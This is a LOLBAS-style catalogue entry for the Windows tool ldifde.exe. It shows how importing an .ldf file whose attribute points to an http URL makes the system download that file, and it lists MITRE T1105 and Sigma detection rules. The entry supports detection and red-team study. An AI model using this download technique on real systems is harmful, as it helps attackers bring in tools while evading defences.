---
Acknowledgement:
- Person: Grzegorz Two
Author: Grzegorz Tworek
Commands:
- Category: Download
  Command: Ldifde -i -f {PATH:.ldf}
  Description: Import specified .ldf file into LDAP. If the file contains http-based
    attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file
    will be downloaded into IE temp folder.
  MitreID: T1105
  OperatingSystem: Windows Server with AD Domain Services role,  Windows 10 with AD
    LDS role.
  Privileges: Administrator
  Usecase: Download file from Internet
Created: 2022-08-31
Description: Creates, modifies, and deletes LDAP directory objects.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_export.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules/windows/process_creation/proc_creation_win_ldifde_file_load.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/3d172914f6c2bd5c2b5ed471bf0657a662d395af/rules-emerging-threats/2019/TA/APT31/proc_creation_win_apt_apt31_judgement_panda.yml
Full_Path:
- Path: c:\windows\system32\ldifde.exe
- Path: c:\windows\syswow64\ldifde.exe
Name: Ldifde.exe
Resources:
- Link: https://twitter.com/0gtweet/status/1564968845726580736
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# Ldifde.exe

Creates, modifies, and deletes LDAP directory objects.

# Path(s)

- `c:\windows\system32\ldifde.exe`
- `c:\windows\syswow64\ldifde.exe`

# Download Commands

Import specified .ldf file into LDAP. If the file contains http-based attrval-spec such as `thumbnailPhoto:< http://example.org/somefile.txt`, the file will be downloaded into IE temp folder.

```batch
Ldifde -i -f {PATH:.ldf}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** Administrator
- **MitreID:** `T1105`
- **Operating System(s):** Windows Server with AD Domain Services role,  Windows 10 with AD LDS role.



# Resource(s)

- https://twitter.com/0gtweet/status/1564968845726580736
# Acknowledgements

- Grzegorz Tworek (Authored, 2022-08-31)
- Grzegorz Two